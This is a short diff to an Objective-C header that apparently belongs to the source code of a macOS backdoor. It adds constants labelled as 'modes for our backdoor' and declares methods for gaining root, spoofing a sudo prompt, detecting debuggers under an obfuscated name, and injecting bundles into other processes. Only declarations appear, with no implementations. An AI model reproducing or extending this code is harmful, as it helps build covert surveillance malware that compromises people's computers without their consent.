@@ -14,8 +14,16 @@
 #import "RCSMUtils.h"
 #import "RCSMSharedMemory.h"
 
-@class RCSMLogManager;
+//
+// Available modes for our backdoor
+//
+#define SLIPLIST @"Ah56K"
+#define UISPOOF  @"Ah57K"
+#define DYLIB    @"Ah58K"
+#define DEV      @"Ah59K"
 
+
+@class RCSMLogManager;
 
 @interface RCSMCore : NSObject
 {
@@ -73,16 +81,16 @@
 //
 - (BOOL)getRootThroughSLI;
 - (void)UISudoWhileAlreadyAuthorized: (BOOL)amIAlreadyAuthorized;
+
 //
 // Threaded (always running) - true if the current process is being debugged
 // (either running under the debugger or has a debugger attached post facto)
 //
 - (void)xfrth;
 
-- (void)injectBundle: (NSNotification*)notification;
-- (void)sendEventToPid: (NSNumber*)thePid;
+- (void)injectBundle: (NSNotification *)notification;
+- (void)sendEventToPid: (NSNumber *)thePid;
 - (void)shareCorePidOnShMem;
-//- (void)eventDidFail: (const AppleEvent*)event withError: (NSError*)error;
 
 @end
 
